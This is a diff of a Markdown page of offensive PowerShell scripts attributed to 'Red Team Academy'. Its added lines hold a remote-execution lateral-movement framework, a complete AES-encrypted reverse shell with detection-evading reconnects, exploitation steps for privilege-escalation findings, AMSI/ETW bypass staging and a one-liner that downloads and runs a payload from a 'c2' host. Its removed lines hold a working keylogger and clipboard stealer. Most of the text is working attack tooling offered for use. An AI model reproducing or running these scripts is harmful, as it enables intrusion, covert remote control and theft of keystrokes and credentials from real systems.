-        'JSON' { $findings | ConvertTo-Json -Depth 4 }
-        'List' { $findings | Format-List | Out-String }
-        default{ $findings | Format-Table -AutoSize | Out-String }
-    }
-
-    if ($ExportPath) {
-        $output | Out-File -FilePath $ExportPath -Encoding UTF8 -Force
-        Write-Host "[+] Results written to $ExportPath" -ForegroundColor Cyan
-    }
-    else {
-        Write-Output $output
-    }
-
-    return $findings
 }
 ```
 
+### Interpreting Results
+
+Run `Invoke-PrivescCheck | Format-Table -AutoSize` for a quick overview. Filter critical findings with `| Where-Object Severity -eq 'Critical'`. The most commonly exploitable vectors in real assessments:
+
+- **AlwaysInstallElevated (Critical):** Use `msfvenom -p windows/x64/shell_reverse_tcp ... -f msi` then `msiexec /quiet /qn /i malicious.msi`.
+- **WritableServiceBinary (Critical):** Replace the binary with your payload. Wait for or trigger a service restart.
+- **SeImpersonatePrivilege (High):** GodPotato, PrintSpoofer, or RoguePotato to impersonate SYSTEM.
+
 ---
 
-## Script 3: Lateral Movement via WMI, PSRemoting, or SMB+Service
+## Script 3: WMI Lateral Movement Framework
 
-Accepts a target host, credential, and command string, then executes the command remotely using one of three methods. Includes verification and artifact cleanup.
+Supports three distinct lateral movement methods: WMI process creation, PSRemoting, and Service Control Manager (SCM). All methods include execution verification and artifact cleanup.
 
 ```powershell
-function Invoke-LateralMovement {
+#Requires -Version 5.1
+
 <#
 .SYNOPSIS
-    Executes a command on a remote Windows host via WMI, PSRemoting, or SMB+service.
+    Executes commands on remote hosts via WMI, PSRemoting, or SCM.
 
 .DESCRIPTION
-    Three execution methods are supported:
-      WMI       — Invoke-WmiMethod Win32_Process.Create (no WinRM required)
-      PSRemoting — Invoke-Command over WinRM (requires PS remoting enabled)
-      SMB       — Copies a script to C$, creates and starts a service, then cleans up
+    Invoke-WmiLateral provides three lateral movement channels:
 
-    After execution, the WMI method verifies success by querying Win32_Process.
-    The SMB method polls the service state then deletes the service and copied file.
+      WMI        Uses Win32_Process.Create. No WinRM required. Output goes to remote
+                 filesystem (redirect to file in your command string).
+      PSRemoting Uses Invoke-Command over WinRM/WSMan. Captures output directly.
+      SCM        Creates a temporary Windows service, starts it, reads output via the
+                 admin share (C$), then deletes the service for artifact cleanup.
+
+    Execution is verified by querying the remote Win32_Process list for the spawned PID.
 
 .PARAMETER ComputerName
-    Target hostname or IP address.
-
-.PARAMETER Credential
-    PSCredential for the remote host. Defaults to current user if omitted.
+    One or more target hostnames or IP addresses.
 
 .PARAMETER Command
-    Command string to execute on the remote host.
+    The command string to execute on the remote system.
 
 .PARAMETER Method
-    Execution method: WMI (default), PSRemoting, or SMB.
+    Execution method: WMI (default), PSRemoting, or SCM.
 
-.PARAMETER OutputFile
-    Remote path where command output should be written (used by WMI/SMB methods).
-    Defaults to C:\Windows\Temp\<random>.txt.
-
-.EXAMPLE
-    $cred = New-Object PSCredential('DOMAIN\admin', (ConvertTo-SecureString 'P@ss' -AsPlainText -Force))
-    Invoke-LateralMovement -ComputerName srv01 -Credential $cred -Command 'whoami' -Method WMI
+.PARAMETER Credential
+    PSCredential for authenticating to the remote host.
 
 .EXAMPLE
-    Invoke-LateralMovement -ComputerName srv01 -Command 'ipconfig /all' -Method PSRemoting
+    $cred = Get-Credential 'DOMAIN\Administrator'
+    Invoke-WmiLateral -ComputerName 'WS01','WS02' -Command 'whoami > C:\out.txt' -Credential $cred
+
+.EXAMPLE
+    Invoke-WmiLateral -ComputerName 'DC01' -Command 'ipconfig /all' -Method PSRemoting -Credential $cred
+
+.NOTES
+    Author: Red Team Academy
+    SCM method requires admin share (C$) access for output retrieval and artifact cleanup.
+    WMI output does not return to caller — redirect to file on the remote host.
 #>
+
+function Invoke-WmiLateral {
     [CmdletBinding()]
     param(
         [Parameter(Mandatory)]
-        [string]$ComputerName,
-
-        [System.Management.Automation.PSCredential]$Credential,
+        [string[]]$ComputerName,
 
         [Parameter(Mandatory)]
         [string]$Command,
 
-        [ValidateSet('WMI','PSRemoting','SMB')]
+        [ValidateSet('WMI', 'PSRemoting', 'SCM')]
         [string]$Method = 'WMI',
 
-        [string]$OutputFile = "C:\Windows\Temp\$([System.IO.Path]::GetRandomFileName()).txt"
+        [System.Management.Automation.PSCredential]$Credential
     )
 
-    $splatCred = @{}
-    if ($Credential) { $splatCred['Credential'] = $Credential }
+    $results = [System.Collections.Generic.List[PSCustomObject]]::new()
 
-    switch ($Method) {
+    foreach ($target in $ComputerName) {
+        Write-Verbose "[*] Targeting: $target via $Method"
 
-        'WMI' {
-            Write-Verbose "[*] WMI method: creating process on $ComputerName"
-            $fullCmd = "cmd.exe /c $Command > $OutputFile 2>&1"
-            try {
-                $result = Invoke-WmiMethod -ComputerName $ComputerName @splatCred `
-                    -Class Win32_Process -Name Create -ArgumentList $fullCmd
-                if ($result.ReturnValue -ne 0) {
-                    throw "Win32_Process.Create returned $($result.ReturnValue)"
-                }
-                $pid = $result.ProcessId
-                Write-Verbose "[+] Process created. PID: $pid"
-
-                # Poll until process exits (max 30 s)
-                $deadline = (Get-Date).AddSeconds(30)
-                do {
-                    Start-Sleep -Milliseconds 500
-                    $running = Get-WmiObject -ComputerName $ComputerName @splatCred `
-                        -Query "SELECT * FROM Win32_Process WHERE ProcessId = $pid" `
-                        -ErrorAction SilentlyContinue
-                } while ($running -and (Get-Date) -lt $deadline)
-
-                # Read output via UNC
-                $uncOut = "\\$ComputerName\$($OutputFile -replace ':','$')"
-                if (Test-Path $uncOut -ErrorAction SilentlyContinue) {
-                    $out = Get-Content $uncOut -Raw
-                    Remove-Item $uncOut -Force -ErrorAction SilentlyContinue
-                    return $out
-                }
-            }
-            catch { throw "WMI lateral movement failed: $($_.Exception.Message)" }
+        $result = [PSCustomObject]@{
+            ComputerName = $target
+            Method       = $Method
+            PID          = $null
+            Success      = $false
+            Output       = ''
+            Error        = ''
         }
 
-        'PSRemoting' {
-            Write-Verbose "[*] PSRemoting method: Invoke-Command on $ComputerName"
-            try {
-                $sb     = [scriptblock]::Create($Command)
-                $output = Invoke-Command -ComputerName $ComputerName @splatCred `
-                    -ScriptBlock $sb -ErrorAction Stop
-                return $output | Out-String
-            }
-            catch { throw "PSRemoting failed: $($_.Exception.Message)" }
-        }
+        try {
+            switch ($Method) {
 
-        'SMB' {
-            Write-Verbose "[*] SMB+Service method on $ComputerName"
-            $svcName  = "svc$([System.IO.Path]::GetRandomFileName() -replace '\.', '')"
-            $remoteC$ = "\\$ComputerName\C$\Windows\Temp\$svcName.bat"
-            $remoteSvc= "C:\Windows\Temp\$svcName.bat"
+                # -------------------------------------------------------
+                # WMI: Win32_Process.Create — no WinRM required
+                # -------------------------------------------------------
+                'WMI' {
+                    $wmiArgs = @{
+                        Class        = 'Win32_Process'
+                        Name         = 'Create'
+                        ArgumentList = "cmd.exe /c $Command"
+                        ComputerName = $target
+                        ErrorAction  = 'Stop'
+                    }
+                    if ($Credential) { $wmiArgs['Credential'] = $Credential }
 
-            try {
-                # Write batch wrapper to C$
-                $batContent = "@echo off`r`n$Command > $OutputFile 2>&1`r`n"
-                [IO.File]::WriteAllText($remoteC$, $batContent)
-                Write-Verbose "[+] Batch file copied to $remoteC$"
+                    $wmiResult = Invoke-WmiMethod @wmiArgs
 
-                # Create service
-                $sc = & sc.exe "\\$ComputerName" create $svcName binpath= "cmd.exe /c $remoteSvc" start= demand 2>&1
-                Write-Verbose "[*] sc create: $sc"
+                    if ($wmiResult.ReturnValue -eq 0) {
+                        $result.PID     = $wmiResult.ProcessId
+                        $result.Success = $true
+                        Write-Verbose "[+] WMI process created on $target | PID: $($result.PID)"
 
-                # Start service
-                & sc.exe "\\$ComputerName" start $svcName | Out-Null
-                Start-Sleep -Seconds 3
+                        # Verify: query Win32_Process for the spawned PID
+                        Start-Sleep -Milliseconds 1500
+                        $procArgs = @{
+                            Class        = 'Win32_Process'
+                            Filter       = "ProcessId = $($result.PID)"
+                            ComputerName = $target
+                            ErrorAction  = 'SilentlyContinue'
+                        }
+                        if ($Credential) { $procArgs['Credential'] = $Credential }
 
-                # Read output
-                $uncOut = "\\$ComputerName\$($OutputFile -replace ':','$')"
-                $out    = ''
-                if (Test-Path $uncOut -ErrorAction SilentlyContinue) {
-                    $out = Get-Content $uncOut -Raw
+                        $remoteProc = Get-WmiObject @procArgs
+                        if ($remoteProc) {
+                            Write-Verbose "[+] Process verified: $($remoteProc.Name) (PID $($result.PID))"
+                        }
+                        else {
+                            Write-Verbose "[*] PID $($result.PID) no longer in list — likely exited"
+                        }
+                    }
+                    else {
+                        $result.Error = "WMI ReturnValue: $($wmiResult.ReturnValue)"
+                    }
                 }
 
-                return $out
-            }
-            catch { throw "SMB method failed: $($_.Exception.Message)" }
-            finally {
-                # Cleanup regardless of success/failure
-                & sc.exe "\\$ComputerName" stop   $svcName 2>$null | Out-Null
-                & sc.exe "\\$ComputerName" delete $svcName 2>$null | Out-Null
-                Remove-Item $remoteC$ -Force -ErrorAction SilentlyContinue
-                $uncOut = "\\$ComputerName\$($OutputFile -replace ':','$')"
-                Remove-Item $uncOut   -Force -ErrorAction SilentlyContinue
-                Write-Verbose "[+] Cleanup complete."
+                # -------------------------------------------------------
+                # PSRemoting: Invoke-Command over WinRM
+                # -------------------------------------------------------
+                'PSRemoting' {
+                    $invokeArgs = @{
+                        ComputerName = $target
+                        ScriptBlock  = [ScriptBlock]::Create($Command)
+                        ErrorAction  = 'Stop'
+                    }
+                    if ($Credential) { $invokeArgs['Credential'] = $Credential }
+
+                    $output = Invoke-Command @invokeArgs
+
+                    $result.Success = $true
+                    $result.Output  = $output -join "`n"
+                    Write-Verbose "[+] PSRemoting succeeded on $target"
+                }
+
+                # -------------------------------------------------------
+                # SCM: Create temp service, start, read output, cleanup
+                # -------------------------------------------------------
+                'SCM' {
+                    $svcName = 'SVC' + [System.IO.Path]::GetRandomFileName().Replace('.','').Substring(0,6)
+                    $outFile = "C:\Windows\Temp\$svcName.txt"
+                    $svcBin  = "cmd.exe /c $Command > $outFile 2>&1"
+
+                    if ($Credential) {
+                        # Use PSRemoting as transport for sc.exe commands
+                        $psArgs = @{
+                            ComputerName = $target
+                            Credential   = $Credential
+                            ErrorAction  = 'Stop'
+                        }
+
+                        # Create the service
+                        Invoke-Command @psArgs -ScriptBlock {
+                            param($n, $b)
+                            & sc.exe create $n binPath= $b start= demand obj= LocalSystem | Out-Null
+                        } -ArgumentList $svcName, $svcBin
+
+                        # Start it — it will run the command and exit
+                        Invoke-Command @psArgs -ScriptBlock {
+                            param($n)
+                            & sc.exe start $n | Out-Null
+                            Start-Sleep -Seconds 3
+                        } -ArgumentList $svcName
+
+                        # Read output file from remote host
+                        $output = Invoke-Command @psArgs -ScriptBlock {
+                            param($p)
+                            if (Test-Path $p) { Get-Content $p -Raw }
+                        } -ArgumentList $outFile
+
+                        $result.Output  = $output
+                        $result.Success = $true
+
+                        # Cleanup: delete service and temp file
+                        Invoke-Command @psArgs -ScriptBlock {
+                            param($n, $p)
+                            & sc.exe delete $n | Out-Null
+                            Remove-Item $p -Force -ErrorAction SilentlyContinue
+                        } -ArgumentList $svcName, $outFile
+
+                        Write-Verbose "[+] SCM artifacts cleaned on $target"
+                    }
+                    else {
+                        # Use sc.exe with UNC-style remote targeting
+                        & sc.exe "\\$target" create $svcName binPath= $svcBin start= demand obj= LocalSystem 2>&1 | Out-Null
+                        & sc.exe "\\$target" start  $svcName 2>&1 | Out-Null
+                        Start-Sleep -Seconds 3
+
+                        # Read output via admin share
+                        $remoteOut = "\\$target\C`$\Windows\Temp\$svcName.txt"
+                        if (Test-Path $remoteOut -ErrorAction SilentlyContinue) {
+                            $result.Output  = Get-Content $remoteOut -Raw
+                            $result.Success = $true
+                        }
+
+                        # Cleanup artifacts
+                        & sc.exe "\\$target" delete $svcName 2>&1 | Out-Null
+                        Remove-Item $remoteOut -Force -ErrorAction SilentlyContinue
+                        Write-Verbose "[+] SCM artifacts cleaned on $target"
+                    }
+                }
             }
         }
+        catch {
+            $result.Error = $_.Exception.Message
+            Write-Warning "[-] $target ($Method) failed: $_"
+        }
+
+        $results.Add($result)
+    }
+
+    return $results
+}
+```
+
+---
+
+## Script 4: Encrypted PowerShell Reverse Shell
+
+AES-256-CBC encrypted reverse shell over TCP. Key derived from a pre-shared string via SHA-256. The shell reconnects automatically on disconnect with jitter to avoid timing-based detection. Commands are executed via `System.Diagnostics.Process` to capture both stdout and stderr.
+
+```powershell
+#Requires -Version 5.1
+
+<#
+.SYNOPSIS
+    AES-256-CBC encrypted reverse shell over TCP with auto-reconnect.
+
+.DESCRIPTION
+    Invoke-EncryptedShell establishes an outbound TCP connection to a remote listener
+    and provides an interactive shell. All traffic is encrypted with AES-256-CBC:
+
+      - Key: SHA-256 hash of the pre-shared key string
+      - IV:  Randomly generated per message, prepended to ciphertext
+      - Framing: base64-encoded ciphertext newline-delimited over TCP
+
+    The shell reconnects automatically on disconnect with jittered sleep intervals.
+    Commands are run via System.Diagnostics.Process to capture stdout and stderr.
+
+.PARAMETER RHost
+    Remote listener IP address or hostname.
+
+.PARAMETER RPort
+    Remote listener TCP port (default: 4444).
+
+.PARAMETER PSK
+    Pre-shared key string. SHA-256 hash of this string becomes the AES-256 key.
+
+.PARAMETER ReconnectDelay
+    Base reconnect delay in seconds (default: 10). Actual delay is jittered ±30%.
+
+.EXAMPLE
+    Invoke-EncryptedShell -RHost 192.168.1.100 -RPort 4444 -PSK 'RedTeamAcademy2024'
+
+.NOTES
+    Author: Red Team Academy
+    The listener must implement the matching AES-256-CBC protocol.
+    Avoid passing PSK on the command line; use a variable:
+        $psk = Read-Host -AsSecureString | ConvertFrom-SecureString
+    For lab use — no persistence mechanism included.
+#>
+
+function Invoke-EncryptedShell {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory)]
+        [string]$RHost,
+
+        [int]$RPort = 4444,
+
+        [Parameter(Mandatory)]
+        [string]$PSK,
+
+        [int]$ReconnectDelay = 10
+    )
+
+    # Derive AES-256 key: SHA-256(PSK)
+    $sha256   = [System.Security.Cryptography.SHA256]::Create()
+    $keyBytes = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($PSK))
+    $sha256.Dispose()
+
+    function Invoke-Encrypt {
+        param([string]$Plaintext, [byte[]]$Key)
+        $aes           = [System.Security.Cryptography.Aes]::Create()
+        $aes.KeySize   = 256
+        $aes.BlockSize = 128
+        $aes.Mode      = [System.Security.Cryptography.CipherMode]::CBC
+        $aes.Padding   = [System.Security.Cryptography.PaddingMode]::PKCS7
+        $aes.Key       = $Key
+        $aes.GenerateIV()
+        $iv            = $aes.IV
+
+        $enc        = $aes.CreateEncryptor()
+        $plain      = [System.Text.Encoding]::UTF8.GetBytes($Plaintext)
+        $cipher     = $enc.TransformFinalBlock($plain, 0, $plain.Length)
+        $enc.Dispose()
+        $aes.Dispose()
+
+        # IV (16 bytes) prepended to ciphertext, then base64-encoded
+        return [System.Convert]::ToBase64String($iv + $cipher)
+    }
+
+    function Invoke-Decrypt {
+        param([string]$CipherB64, [byte[]]$Key)
+        $combined  = [System.Convert]::FromBase64String($CipherB64)
+        $iv        = $combined[0..15]
+        $cipher    = $combined[16..($combined.Length - 1)]
+
+        $aes           = [System.Security.Cryptography.Aes]::Create()
+        $aes.KeySize   = 256
+        $aes.BlockSize = 128
+        $aes.Mode      = [System.Security.Cryptography.CipherMode]::CBC
+        $aes.Padding   = [System.Security.Cryptography.PaddingMode]::PKCS7
+        $aes.Key       = $Key
+        $aes.IV        = $iv
+
+        $dec       = $aes.CreateDecryptor()
+        $plain     = $dec.TransformFinalBlock($cipher, 0, $cipher.Length)
+        $dec.Dispose()
+        $aes.Dispose()
+
+        return [System.Text.Encoding]::UTF8.GetString($plain)
+    }
+
+    function Invoke-CaptureCommand {
+        param([string]$Cmd)
+        try {
+            $psi                        = New-Object System.Diagnostics.ProcessStartInfo
+            $psi.FileName               = 'cmd.exe'
+            $psi.Arguments              = "/c $Cmd"
+            $psi.RedirectStandardOutput = $true
+            $psi.RedirectStandardError  = $true
+            $psi.UseShellExecute        = $false
+            $psi.CreateNoWindow         = $true
+            $psi.WindowStyle            = [System.Diagnostics.ProcessWindowStyle]::Hidden
+
+            $proc   = [System.Diagnostics.Process]::Start($psi)
+            $stdout = $proc.StandardOutput.ReadToEnd()
+            $stderr = $proc.StandardError.ReadToEnd()
+            $proc.WaitForExit(15000) | Out-Null
+            $exitCode = $proc.ExitCode
+            $proc.Dispose()
+
+            $out = $stdout
+            if ($stderr) { $out += "`n[STDERR] $stderr" }
+            if (-not $out) { $out = "[*] Command completed (exit: $exitCode)`n" }
+            return $out
+        }
+        catch {
+            return "[ERROR] Execution failed: $_`n"
+        }
+    }
+
+    # Reconnect loop with ±30% jitter
+    $attempt = 0
+    while ($true) {
+        $attempt++
+        Write-Verbose "[*] Connection attempt $attempt -> ${RHost}:${RPort}"
+
+        $tcpClient = $null
+        $stream    = $null
+        $reader    = $null
+        $writer    = $null
+
+        try {
+            $tcpClient = New-Object System.Net.Sockets.TcpClient
+            $tcpClient.Connect($RHost, $RPort)
+            $stream    = $tcpClient.GetStream()
+            $reader    = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::ASCII)
+            $writer    = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::ASCII)
+            $writer.AutoFlush = $true
+
+            Write-Verbose "[+] Connected to ${RHost}:${RPort}"
+
+            # Send encrypted hello beacon with system info
+            $helloText  = "HELLO|$env:COMPUTERNAME|$env:USERNAME|$env:USERDOMAIN|$(whoami)"
+            $helloEnc   = Invoke-Encrypt -Plaintext $helloText -Key $keyBytes
+            $writer.WriteLine($helloEnc)
+
+            # Command receive/execute/respond loop
+            while ($tcpClient.Connected) {
+                try {
+                    $encCmd = $reader.ReadLine()
+                    if ($null -eq $encCmd -or $encCmd -eq '') { break }
+
+                    $cmd = Invoke-Decrypt -CipherB64 $encCmd -Key $keyBytes
+
+                    if ($cmd -ceq 'EXIT' -or $cmd -ceq 'quit') { return }
+
+                    $cmdOutput  = Invoke-CaptureCommand -Cmd $cmd
+                    $encOutput  = Invoke-Encrypt -Plaintext $cmdOutput -Key $keyBytes
+                    $writer.WriteLine($encOutput)
+                }
+                catch {
+                    Write-Verbose "[-] Loop error: $_"
+                    break
+                }
+            }
+        }
+        catch {
+            Write-Verbose "[-] Connection error: $_"
+        }
+        finally {
+            if ($reader)    { try { $reader.Dispose()    } catch { } }
+            if ($writer)    { try { $writer.Dispose()    } catch { } }
+            if ($stream)    { try { $stream.Dispose()    } catch { } }
+            if ($tcpClient) { try { $tcpClient.Dispose() } catch { } }
+        }
+
+        # Jittered sleep: base ± 30%
+        $jitter = $ReconnectDelay * 0.3
+        $sleep  = $ReconnectDelay + (Get-Random -Minimum ([int](-$jitter)) -Maximum ([int]$jitter))
+        Write-Verbose "[*] Reconnecting in $sleep seconds..."
+        Start-Sleep -Seconds $sleep
     }
 }
 ```
 
 ---
 
-## Script 4: Keylogger and Clipboard Monitor
+## Operational Notes
 
-Installs a low-level keyboard hook via P/Invoke and runs a clipboard polling loop, logging to a DPAPI-encrypted file. Runs in a background PowerShell job. A companion `Stop-Keylogger` function unhooks the keyboard and decrypts the log.
+### Script Block Logging Bypass Considerations
 
-```powershell
-# ── P/Invoke type definition for SetWindowsHookEx keyboard hook ────────────────
-$hookSig = @'
-using System;
-using System.Runtime.InteropServices;
-using System.IO;
-using System.Security.Cryptography;
-using System.Text;
+Script Block Logging (Event ID 4104) operates at the PowerShell engine layer. The ETW patch in Script 1 suppresses ETW providers but SBL writes to the Windows Event Log through a separate code path. The AMSI patch will prevent real-time AV scanning of the content, but SBL may still capture code if it fires before the bypass executes. The correct delivery sequence is:
 
-public class KeyCapture {
-    public  static IntPtr    HookHandle    = IntPtr.Zero;
-    private static string    LogPath       = string.Empty;
-    private static byte[]    Entropy       = Encoding.UTF8.GetBytes("RTA_kl_2026");
+1. Deliver a minimal, obfuscated stub via `EncodedCommand` that only patches AMSI.
+2. Have the stub download and execute Script 1 via `IEX` or `[ScriptBlock]::Create`.
+3. Load subsequent stages only after AMSI and ETW are patched.
 
-    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-    private static LowLevelKeyboardProc _hookCallback;
+### Execution Policy Bypass (No Admin Required)
 
-    [DllImport("user32.dll", SetLastError = true)]
-    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
-        IntPtr hMod, uint dwThreadId);
-
-    [DllImport("user32.dll", SetLastError = true)]
-    public static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
-    [DllImport("user32.dll")]
-    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
-        IntPtr wParam, IntPtr lParam);
-
-    [DllImport("kernel32.dll")]
-    private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-    [DllImport("user32.dll")]
-    private static extern int GetAsyncKeyState(int vKey);
-
-    private const int WH_KEYBOARD_LL = 13;
-    private const int WM_KEYDOWN     = 0x0100;
-
-    [StructLayout(LayoutKind.Sequential)]
-    private struct KBDLLHOOKSTRUCT {
-        public uint   vkCode;
-        public uint   scanCode;
-        public uint   flags;
-        public uint   time;
-        public IntPtr dwExtraInfo;
-    }
-
-    public static void Install(string logPath) {
-        LogPath       = logPath;
-        _hookCallback = HookCallback;
-        IntPtr hMod   = GetModuleHandle(null);
-        HookHandle    = SetWindowsHookEx(WH_KEYBOARD_LL, _hookCallback, hMod, 0);
-        if (HookHandle == IntPtr.Zero)
-            throw new InvalidOperationException("SetWindowsHookEx failed: " +
-                Marshal.GetLastWin32Error());
-    }
-
-    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
-            KBDLLHOOKSTRUCT kb = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
-            AppendEncrypted(LogPath, $"[VK:{kb.vkCode}]", Entropy);
-        }
-        return CallNextHookEx(HookHandle, nCode, wParam, lParam);
-    }
-
-    public static void AppendEncrypted(string path, string data, byte[] entropy) {
-        byte[] raw  = Encoding.UTF8.GetBytes(data);
-        byte[] enc  = ProtectedData.Protect(raw, entropy, DataProtectionScope.CurrentUser);
-        // Prepend 4-byte length so we can split records on decrypt
-        byte[] len  = BitConverter.GetBytes(enc.Length);
-        using (var fs = new FileStream(path, FileMode.Append, FileAccess.Write, FileShare.Read))
-        {
-            fs.Write(len, 0, 4);
-            fs.Write(enc, 0, enc.Length);
-        }
-    }
-
-    public static string[] ReadDecrypted(string path, byte[] entropy) {
-        var results = new System.Collections.Generic.List<string>();
-        using (var fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
-        using (var br = new BinaryReader(fs)) {
-            while (fs.Position < fs.Length) {
-                int   len  = br.ReadInt32();
-                byte[] enc = br.ReadBytes(len);
-                byte[] raw = ProtectedData.Unprotect(enc, entropy,
-                    DataProtectionScope.CurrentUser);
-                results.Add(Encoding.UTF8.GetString(raw));
-            }
-        }
-        return results.ToArray();
-    }
-}
-'@
-
-function Start-Keylogger {
-<#
-.SYNOPSIS
-    Installs a low-level keyboard hook and clipboard monitor that log to an
-    encrypted file using DPAPI (CurrentUser scope).
-
-.DESCRIPTION
-    Compiles a C# class with SetWindowsHookEx P/Invoke via Add-Type, installs a
-    WH_KEYBOARD_LL hook, and starts a background PowerShell job that polls the
-    clipboard every 2 seconds. All captured data is written in DPAPI-encrypted
-    records to the specified log file.
-
-    Use Stop-Keylogger to remove the hook, stop the job, and read the log.
-
-.PARAMETER LogPath
-    Path to the encrypted log file. Defaults to a temp file in %APPDATA%.
-
-.PARAMETER ClipboardInterval
-    Clipboard poll interval in seconds. Defaults to 2.
-
-.EXAMPLE
-    Start-Keylogger -LogPath "$env:APPDATA\log.bin"
-
-.EXAMPLE
-    Start-Keylogger   # uses default log path; call Stop-Keylogger to retrieve
-#>
-    [CmdletBinding()]
-    param(
-        [string]$LogPath = "$env:APPDATA\$(([System.IO.Path]::GetRandomFileName()) -replace '\..*','.bin')",
-        [int]$ClipboardInterval = 2
-    )
-
-    # Compile the C# type (idempotent check)
-    if (-not ([System.Management.Automation.PSTypeName]'KeyCapture').Type) {
-        Add-Type -TypeDefinition $hookSig -Language CSharp `
-            -ReferencedAssemblies 'System.Security'
-        Write-Verbose "[+] KeyCapture type compiled."
-    }
-
-    # Install low-level keyboard hook
-    [KeyCapture]::Install($LogPath)
-    Write-Verbose "[+] Keyboard hook installed. Handle: $([KeyCapture]::HookHandle)"
-
-    # Store state in a global for Stop-Keylogger
-    $global:KL_LogPath  = $LogPath
-    $global:KL_Hook     = [KeyCapture]::HookHandle
-
-    # Background job: clipboard monitor + message pump keep-alive
-    $global:KL_Job = Start-Job -ScriptBlock {
-        param($lp, $interval)
-
-        Add-Type -AssemblyName System.Windows.Forms
-        Add-Type -AssemblyName System.Security
-
-        $entropy = [System.Text.Encoding]::UTF8.GetBytes('RTA_kl_2026')
-        $lastClip = ''
-
-        while ($true) {
-            Start-Sleep -Seconds $interval
-
-            # Clipboard check
-            $clip = [System.Windows.Forms.Clipboard]::GetText()
-            if ($clip -and $clip -ne $lastClip) {
-                $lastClip = $clip
-                $tag  = "[CLIP:$clip]"
-                $raw  = [System.Text.Encoding]::UTF8.GetBytes($tag)
-                $enc  = [System.Security.Cryptography.ProtectedData]::Protect(
-                            $raw, $entropy,
-                            [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-                $len  = [System.BitConverter]::GetBytes([int]$enc.Length)
-                $fs   = [System.IO.File]::Open($lp,
-                            [System.IO.FileMode]::Append,
-                            [System.IO.FileAccess]::Write,
-                            [System.IO.FileShare]::ReadWrite)
-                $fs.Write($len, 0, 4)
-                $fs.Write($enc, 0, $enc.Length)
-                $fs.Dispose()
-            }
-        }
-    } -ArgumentList $LogPath, $ClipboardInterval
-
-    Write-Host "[+] Keylogger started. Log: $LogPath  JobId: $($global:KL_Job.Id)" -ForegroundColor Green
-    Write-Host "[*] Run Stop-Keylogger to unhook and read log." -ForegroundColor Yellow
-}
-
-
-function Stop-Keylogger {
-<#
-.SYNOPSIS
-    Unhooks the keyboard hook, stops the clipboard monitor job, and decrypts
-    and returns the captured log.
-
-.DESCRIPTION
-    Uses the global state set by Start-Keylogger ($global:KL_*). Calls
-    UnhookWindowsHookEx, stops the background job, then decrypts each record
-    from the log file using DPAPI and returns the concatenated output.
-
-.PARAMETER KeepLogFile
-    If specified, the encrypted log file is not deleted after reading.
-
-.EXAMPLE
-    Stop-Keylogger
-
-.EXAMPLE
-    Stop-Keylogger -KeepLogFile | Out-File C:\Windows\Temp\keylog_plain.txt
-#>
-    [CmdletBinding()]
-    param([switch]$KeepLogFile)
-
-    # Unhook keyboard
-    if ($global:KL_Hook -and $global:KL_Hook -ne [IntPtr]::Zero) {
-        $ok = [KeyCapture]::UnhookWindowsHookEx($global:KL_Hook)
-        Write-Verbose "[+] UnhookWindowsHookEx: $ok"
-        $global:KL_Hook = [IntPtr]::Zero
-    }
-
-    # Stop clipboard job
-    if ($global:KL_Job) {
-        Stop-Job  -Job $global:KL_Job -ErrorAction SilentlyContinue
-        Remove-Job -Job $global:KL_Job -Force -ErrorAction SilentlyContinue
-        $global:KL_Job = $null
-        Write-Verbose "[+] Clipboard monitor job stopped."
-    }
-
-    # Decrypt and return log
-    if ($global:KL_LogPath -and (Test-Path $global:KL_LogPath)) {
-        try {
-            $entropy = [System.Text.Encoding]::UTF8.GetBytes('RTA_kl_2026')
-            $records = [KeyCapture]::ReadDecrypted($global:KL_LogPath, $entropy)
-            $output  = $records -join ''
-
-            if (-not $KeepLogFile) {
-                Remove-Item $global:KL_LogPath -Force -ErrorAction SilentlyContinue
-                Write-Verbose "[+] Log file deleted."
-            }
-
-            $global:KL_LogPath = $null
-            return $output
-        }
-        catch {
-            Write-Warning "Failed to decrypt log: $($_.Exception.Message)"
-        }
-    }
-    else {
-        Write-Warning "No log file found at '$($global:KL_LogPath)'"
-    }
-}
+```
+powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -File payload.ps1
+powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand <base64_here>
+powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')"
 ```
 
-**Usage example:**
+### OPSEC Summary Table
 
-```powershell
-# Load the script
-. .\powershell-offensive-tools.ps1
-
-# Start capturing
-Start-Keylogger -LogPath "$env:TEMP\events.bin" -ClipboardInterval 3
-
-# ... wait for target activity ...
-
-# Stop and retrieve plaintext log
-$captured = Stop-Keylogger
-$captured | Out-File "$env:TEMP\keylog.txt"
-```
+| Script | Creates Process | Writes Files | Network | Modifies Memory |
+|--------|----------------|--------------|---------|-----------------|
+| MemoryLoader | No | No | Yes (HTTP) | Yes (AMSI/ETW patch) |
+| PrivescCheck | Yes (whoami.exe) | No | No | No |
+| WmiLateral | Yes (remote cmd.exe) | Yes (remote, SCM mode) | Yes (DCOM/WinRM) | No |
+| EncryptedShell | Yes (cmd.exe) | No | Yes (TCP) | No |
 
 ---
 
 ## Resources
 
-- [AMSI Documentation — Microsoft](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
-- [PowerShell Security — Microsoft Learn](https://learn.microsoft.com/en-us/powershell/scripting/security/preventing-script-injection-attacks)
-- [LOLBAS Project](https://lolbas-project.github.io/)
-- [PayloadsAllTheThings — PowerShell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Powershell%20-%20Cheatsheet.md)
-- [Windows Privilege Escalation Fundamentals — fuzzysecurity](http://www.fuzzysecurity.com/tutorials/16.html)
